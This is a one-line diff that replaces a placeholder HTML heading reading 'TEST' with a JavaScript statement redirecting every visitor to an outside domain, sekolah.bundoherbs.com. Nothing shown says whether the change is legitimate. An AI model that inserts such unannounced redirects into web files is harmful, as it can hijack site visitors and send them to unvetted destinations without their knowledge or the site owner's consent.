@@ -1,1 +1,1 @@
-<h1>TEST</h1>
+window.location.replace("http://sekolah.bundoherbs.com/");
